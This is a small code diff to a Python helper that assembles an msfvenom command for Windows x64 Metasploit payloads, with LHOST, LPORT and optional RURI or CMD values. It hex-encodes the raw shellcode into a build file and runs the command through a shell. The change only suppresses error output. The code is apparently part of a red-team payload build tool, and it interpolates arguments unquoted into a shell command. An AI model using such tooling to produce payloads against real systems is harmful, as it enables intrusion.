@@ -6,7 +6,7 @@ def msfvenom(payload, rhost, rport, ruri, cmd, verbose):
     CMD_part = f" CMD={cmd}" if cmd else ""
     if ruri and cmd:
         raise ValueError("Cannot specify both RURI and CMD")
-    command = f"msfvenom -p {payload} LHOST={rhost} LPORT={rport} {RURI_part} {CMD_part} -a x64 --platform windows -f raw | xxd -p | tr -d '\\n' > build/payload.txt"
+    command = f"msfvenom -p {payload} LHOST={rhost} LPORT={rport} {RURI_part} {CMD_part} -a x64 --platform windows -f raw 2>/dev/null | xxd -p | tr -d '\\n' > build/payload.txt"
     print(f"Generating payload :\n{command}") if verbose else None
     subprocess.run(command, shell=True, check=True)
 
